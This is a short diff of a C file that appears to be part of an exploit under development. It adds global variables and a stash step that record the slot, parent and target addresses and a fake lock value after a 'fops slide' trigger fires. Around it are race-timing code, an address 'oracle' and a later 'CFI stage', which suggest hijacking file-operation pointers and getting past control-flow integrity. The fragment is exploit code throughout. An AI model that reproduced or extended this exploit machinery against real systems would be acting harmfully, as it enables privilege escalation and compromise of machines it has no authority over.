@@ -150,6 +150,12 @@ static const uintptr_t slide_p0_offsets[] = {
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
 static uint32_t slide_f_pi_chain;
+/* Last-fired fops route configuration (parent address space). Trusted by
+ * the production-touch probe only when fired_route_slot == 0. */
+size_t fired_route_slot = (size_t)-1;
+uintptr_t fired_route_parent = 0;
+uintptr_t fired_route_target = 0;
+uintptr_t fired_route_lock = 0;
 static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
@@ -2373,6 +2379,13 @@ static int app_trigger_fops_slide_slot(size_t slot) {
           "lock=%016zx delay=%d fine_ticks=%llu\n",
           slot, slide_oracle_parent, slide_oracle_target, fake_lock, delay,
           (unsigned long long)slide_route_fine_delay_ticks);
+  /* Stash the firing configuration for the post-trigger production-touch
+   * probe (parent process address space; children get copies). The probe
+   * only trusts the stash when stash slot == production slot 0. */
+  fired_route_slot = slot;
+  fired_route_parent = slide_oracle_parent;
+  fired_route_target = slide_oracle_target;
+  fired_route_lock = fake_lock;
   app_publish_writer_started();
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   /* A successful child result advances directly to the CFI stage without
